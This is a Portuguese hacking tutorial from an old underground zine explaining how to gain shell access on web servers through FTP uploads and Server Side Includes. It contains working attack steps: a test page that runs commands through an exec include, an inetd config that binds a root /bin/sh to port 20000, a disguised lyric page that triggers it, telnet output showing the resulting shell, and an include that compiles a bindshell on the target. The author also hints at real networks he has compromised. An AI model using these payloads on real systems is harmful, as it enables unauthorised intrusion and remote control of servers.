
			      Unsekurity Scene

Desenvolvido por Martin Fallon.
mar_fallon@yahoo.com.br

Estes e outros artigos podem ser obtidos em:
http://unsekurity.virtualave.net/

OBS: Elites, Pseudo-Elites e Analistas de Seguranca, nao percam o tempo
     precioso de voces lendo este simples artigo! Este artigo eh voltado
     a toda comunidade NewBie,em especial a Comunidade Unsekurity Scene!

			  ***********************
			  *  FTP + SSI = SHELL  *
			  ***********************

1 - Introducao
2 - Configuracoes Bugadas
3 - Exploitando o Sistema
4 - Consideracoes Finais

1 - Introducao
---------------

Existem dezenas, talvez ateh centenas de textos descrevendo os problemas
existentes na mah configuracao de servidores WEB permitindo execucao e
uso de SSI.O motivo d'eu estar escrevendo mais um texto falando sobre como
obter acesso shell em servidores com SSI eh que a maioria dos textos sao
vagos em aspectos hacking! Nao demonstram com clareza aonde esta tecnica
eh aplicada e nem quais os reais perigos de se estar vulneravel a ela!

Olhando pelo lado do hacking etico, realmente eu ainda nao vih um texto
que falasse com clareza, como se exploitar um sistema e como tirar vantagem
em cima desta tecnica! Nao quero com essas linhas menosprezar algum
escritor, afinal, eu nao lih todos os possiveis textos e alguns textos que
abordam este assunto sao bastante bons para o pessoal da seguranca(only
security).

Server Site Include, vulgarmente conhecido como SSI, eh um recurso usado
em websites para criar dados dinamicos em paginas .html! Atravez de uma
"meta-tag", eh possivel se passar parametros atuais e dinamicos como
respostas as requisicoes dos navegadores.O formato de um Server Site
Include segue descrito abaixo:

<!--#elemento atributo="parametros para o atributo" -->

Existem varios "elementos", mas para nos(fucadores) a que mais interessa
eh a "exec"(em alguns casos a echo tb - veja o manual do apache para
maiores detalhes sobre os atributos de SSI).O elemento exec eh responsavel 
por executar comandos shell na maquina alvo! Muitos jah devem estar vendo a 
trivialidade da tecnica! Mas, vamos com calma.

2 - Configuracoes Bugadas
--------------------------

Varios e varios sistemas e servidores web podem estar vulneraveis a
implementacao desta tecnica! Procurando facilitar a vida dos "webmasters",
muitos administradores de rede se esquecem dos problemas existentes em se
habilitar a execucao de parametros SSI.

Para que o ataque possa ser bem implementado, algumas informacoes nos
devem ser fornecidas:

* Uma conta de FTP no sistema alvo com direito a "atualizacao" de home
  pages;

* Servidor WEB permitindo o uso de SSI.Voce pode saber se ele estah
  executando ou nao, das seguintes maneiras:
 
  + Captura do arquivo httpd.conf do apache ou de configuracao dos outros
    Web Servers.No apache, devemos procurar(mais ou menos) pelas seguintes
    linhas descomentadas:

  <Directory />
    Options FollowSymLinks Includes
    AllowOverride None
  </Directory>

   #O que nos importa eh este "Includes"

  <Directory "/usr/local/apache/htdocs">
    Options Indexes FollowSymLinks MultiViews Includes
  </Directory>

  Se voce achou esses "Includes" descomentados nas linhas, entao existe
  uma chance muito forte do servidor alvo estar permitindo a passagem de
  instrucoes SSI.E se vc achar a linha abaixo descomentada, maior chance
  ainda:

  AddHandler server-parsed .shtml

  + Teste SSI no sistema.Se voce nao tem acesso ao httpd.conf, ou nao sabe
    aonde o senhor "root" instalou o apache, voce pode testar se o sistema
    permite o uso de SSI atraves de um simples .shtml teste:

  <html>
  <body>
  Seu Diretorio Atual Tem:
  <!--#exec cmd="/bin/ls"-->
  </body>
  </html>

   Depois voce envia um "get" via navegador para a pagina escrita, e se
   aparecer os arquivos do seu diretorio FTP, entao comemore! Voce tem
   acesso a comandos da shell! Um passo para controlar todo o sistema!

Se voce checou e viu que o sistema estah bugado, entao o proximo passo eh
exploitar o uso de SSI para obter vantagens.

3 - Exploitando o Sistema
--------------------------

Temos acesso FTP, o sistema tah permitindo o uso de SSI.O sistema nao
eh linux! Eh um mainframe de grande porte rodando sabe-se lah qual unix!
Mas eu sei que eh Unix! E se eh unix, eu posso fazer "coisas" com ele!

Nao imaginando uma situacao trivial na qual bastaria enviar uma bindshell
compilada estaticamente em nossa maquina local para o host alvo e depois
executar esta bindshell via SSI, vamos mais alem! Se o sistema nao for
um dos que voce tem, voce precisarah improvisar!! Entao, fucemos!

* Inetd

Criamos um arquivo de configuracao para chamarmos o inetd com o seguinte
conteudo:

20000    stream  tcp     nowait  root    /bin/sh  sh

Enviamos o arquivo para o servidor alvo.Depois enviamos o arquivo .shtml
responsavel pela execucao do SSI:

------------------------- taxi_lunar.shtml ----------------------------

<html>
<title>Martin Fallon largado pela amada!</title>
<body>
"Ela me deu o seu amor.. eu tomei..
 no dia 16 de maio, viajei..
 Espaconave atropelado, procurei..
 O meu amor aperriado!!

 Apenas apanhei na Beira-Mar
 um taxi pra estacao lunar!

 Bela linda criatura, bonita
 Nem menina, nem mulher
 Tem o espelho do seu rosto, de neve
 Nem menina, nem mulher

 Apenas apanhei na Beira-Mar
 um taxi pra estacao lunar!

Pela sua cabeleira, vermelha
pelos raios desse sol, lilaz
pelo fogo do seu corpo, incendeia
belos raios desso sol

Apenas apanhei na Beira-Mar
um taxi pra estacao lunar!"

                        (Taxi Lunar - Zeh Ramalho)

<!--#exec cmd="/usr/sbin/inetd ~vitima/public_html/meuinetd.conf"-->
</body>
</html>

------------------------------------------------------------------------

Aih eh apenas mandar brasa! Get no navegador para a pagina alvo e depois:

# telnet localhost 20000
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
id;
uid=99(nobody) gid=98(nobody) groups=98(nobody)
: command not found
exit;
Connection closed by foreign host.

Podemos ir mais alem, lembre-se que eh o usuario "nobody" que estarah
executando o SSI, logo, em varias redes, ele nao eh chrootado!:)(Respondi o 
desafio!!)..Que o diga a rede da XXXXXX e da YYYYYYYYYYYY e tambem da 
ZZZZZZZZ, ops, outra alih tb!! Serao todas?!?!?!?!:).

chroot e seus conceitos defasados!

* Bindshell

Envia-se um codigo de uma bindshell para o host alvo e manda ele compilar
por lah:

<!--#exec cmd="cc -o bindshell bindshell.c"

Lembre-se de setar o diretorio +rw para que o nobody possa criar arquivos
nele!

4 - Consideracoes Finais
-------------------------

Server Site Includes tambem pode ser usado para invadir sistemas sem
a necessidade de uma conta de FTP no alvo! Existem formulario, bookmarks,
forums e etc que permitem o envio de parametros html e SSI tb!:), mas
isso fica para outro tutorial!

SSI, PHP, Procmail, existem varios outros esquemas para se obter acesso
shell em um host alvo atraves de uma conta valida de FTP! Aos poucos eu
irei disponibilizando maiores esquemas! A musica eh soh para definir meu
estado de espirito! Daqui a dez anos, espero olhar para este artigo numa
situacao completamente diferente! Ou mesmo numa quimera sem fim!

Links:

http://unsekurity.virtualave.net/
http://www.bufferoverflow.org/
http://www.absoluta.org/ -> Tem artigo sobre CGI e SSI.

Um [].
Fallon.
